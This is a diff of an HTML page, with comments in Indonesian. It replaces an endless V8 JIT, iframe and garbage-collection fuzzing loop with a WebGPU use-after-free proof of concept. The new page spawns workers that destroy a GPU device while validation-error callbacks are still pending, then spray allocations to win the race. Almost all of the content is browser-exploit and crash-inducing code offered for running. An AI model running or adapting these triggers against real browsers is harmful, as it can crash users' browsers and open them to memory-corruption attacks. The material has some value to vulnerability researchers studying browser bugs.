@@ -1,133 +1,107 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>V8 Infinite JIT + iframe + GC Fuzz</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebGPU UAF PoC Trigger</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
+        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; height: 300px; overflow-y: scroll; background: #000; }
+    </style>
 </head>
 <body>
-<h1>V8 ThreadIsolation / Infinite Fuzz</h1>
-<p>Biarkan tab ini jalan.</p>
+    <h1>WebGPU UAF/Race Condition Trigger</h1>
+    <p>Target: GPUDevice::OnUncapturedErrorImpl Race Condition</p>
+    <button id="startBtn">Start Trigger Loop</button>
+    <div class="log" id="consoleLog"></div>
 
-<script>
-/* ================= helpers ================= */
+    <script>
+        const logDiv = document.getElementById('consoleLog');
+        function log(msg) {
+            const p = document.createElement('div');
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(p);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
 
-function makeJitFunctions(n) {
-  const arr = [];
-  for (let i = 0; i < n; i++) {
-    arr.push(new Function("x", "return x + 1;"));
-  }
-  return arr;
-}
+        // Worker Script Blob
+        // Ini adalah kode yang akan dijalankan di thread terpisah untuk memicu 
+        // IsWebGPUMultithreadedWorker logic di C++.
+        const workerScript = `
+            self.onmessage = async function(e) {
+                if (!navigator.gpu) {
+                    self.postMessage({type: 'log', msg: 'WebGPU not supported in this browser/worker.'});
+                    return;
+                }
 
-function hotRun(funcs, rounds) {
-  let x = 0;
-  for (let r = 0; r < rounds; r++) {
-    for (let f of funcs) x = f(x);
-  }
-  return x;
-}
+                try {
+                    const adapter = await navigator.gpu.requestAdapter();
+                    if (!adapter) {
+                        self.postMessage({type: 'log', msg: 'No adapter found.'});
+                        return;
+                    }
+                    
+                    const device = await adapter.requestDevice();
+                    self.postMessage({type: 'log', msg: 'Device created. ID: ' + e.data.id});
 
-function compileWasm() {
-  const wasmBytes = new Uint8Array([
-    0x00,0x61,0x73,0x6d,
-    0x01,0x00,0x00,0x00
-  ]);
-  return WebAssembly.compile(wasmBytes).catch(() => {});
-}
+                    // 1. Setup Listener untuk menangkap error async
+                    // Callback ini yang kita harapkan berjalan SETELAH destroy()
+                    device.addEventListener('uncapturederror', (event) => {
+                        // Jika UAF terjadi, akses ke properti internal di sini atau 
+                        // mekanisme dispatch event itu sendiri mungkin crash browser.
+                        self.postMessage({type: 'log', msg: 'Callback fired for: ' + event.error.message});
+                    });
 
-/* ================= iframe srcdoc ================= */
+                    // 2. Lakukan operasi Invalid untuk memicu Error Callback
+                    // Kita membuat buffer dengan usage 0 (invalid) atau size yang aneh
+                    // Operasi ini async di backend (GPU Process -> IO Thread -> Worker Thread)
+                    try {
+                        device.createBuffer({
+                            size: 1024,
+                            usage: 0 // Usage 0 biasanya invalid dan men-trigger validation error
+                        });
+                    } catch(err) {
+                        // Error synchronous diabaikan, kita cari yang async
+                    }
 
-function iframeHTML() {
-  return `
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-  // HTMLDocumentParser + tokenizer pressure
-  for (let i = 0; i < 5000; i++) {
-    const d = document.createElement("div");
-    d.textContent = "tok-" + i;
-    document.body.appendChild(d);
-  }
+                    // 3. SEGERA hancurkan device
+                    // Tujuannya: Objek C++ GPUDevice masuk state destroyed/free
+                    // sementara pesan error dari GPU Process sedang dalam perjalanan (in-flight).
+                    device.destroy();
+                    self.postMessage({type: 'log', msg: 'Device destroyed immediately.'});
 
-  function spam() {
-    let arr = [];
-    for (let i = 0; i < 2000; i++) {
-      arr.push(new Function("y", "return y * 2;"));
-    }
-    let v = 1;
-    for (let r = 0; r < 30; r++) {
-      for (let f of arr) v = f(v);
-    }
-    arr = null;
-    if (parent.gc) parent.gc();
-  }
+                    // 4. Allocation Pressure (Opsional)
+                    // Mencoba memicu Garbage Collection segera untuk membersihkan memori
+                    // agar Use-After-Free lebih mungkin terjadi (mengisi slot memori yang kosong).
+                    const trash = [];
+                    for(let i = 0; i < 10000; i++) {
+                        trash.push(new ArrayBuffer(1024));
+                    }
 
-  setInterval(spam, 5);
-<\/script>
-</body>
-</html>`;
-}
+                } catch (error) {
+                    self.postMessage({type: 'log', msg: 'Worker Error: ' + error});
+                }
+            };
+        `;
 
-/* ================= PHASE 1: YouTube iframe ================= */
+        const blob = new Blob([workerScript], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
 
-const yt = document.createElement("iframe");
-yt.width = "560";
-yt.height = "315";
-yt.src =
-  "https://www.youtube.com/embed/i5p51UDoW0U?list=RDi5p51UDoW0U&autoplay=1";
-yt.allow =
-  "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
-yt.allowFullscreen = true;
-document.body.appendChild(yt);
-
-/* ================= PHASE 2: tokenizer iframe ================= */
-
-const warmupIframe = document.createElement("iframe");
-warmupIframe.srcdoc = iframeHTML();
-document.body.appendChild(warmupIframe);
-
-/* ================= PHASE 3: delay ================= */
-
-setTimeout(() => {
-  console.log("[*] starting INFINITE fuzz");
-  infiniteFuzz();
-}, 3000);
-
-/* ================= PHASE 4: infinite fuzz ================= */
-
-async function infiniteFuzz() {
-  let iter = 0;
-
-  while (true) {
-    // ---- main doc JIT ----
-    let funcs = makeJitFunctions(3000);
-    hotRun(funcs, 20);
-    funcs = null;
-
-    await compileWasm();
-
-    if (typeof gc === "function") gc();
-
-    // ---- churn iframe ----
-    let iframe = document.createElement("iframe");
-    iframe.srcdoc = iframeHTML();
-    document.body.appendChild(iframe);
-
-    await new Promise(r => setTimeout(r, 10));
-
-    iframe.remove();
-    iframe = null;
-
-    if (typeof gc === "function") gc();
-
-    if ((++iter % 50) === 0) {
-      console.log("[*] iter", iter);
-    }
-
-    await new Promise(r => setTimeout(r, 1));
-  }
-}
-</script>
+        document.getElementById('startBtn').addEventListener('click', () => {
+            log("Spawning Workers to race destroy() vs callbacks...");
+            
+            // Kita spawn beberapa worker sekaligus untuk meningkatkan peluang race condition
+            for (let i = 0; i < 5; i++) {
+                const worker = new Worker(workerUrl);
+                worker.onmessage = (e) => {
+                    if (e.data.type === 'log') log(`[Worker ${i}] ${e.data.msg}`);
+                };
+                worker.postMessage({ id: i });
+                
+                // Cleanup worker setelah beberapa saat
+                setTimeout(() => worker.terminate(), 2000);
+            }
+        });
+    </script>
 </body>
 </html>
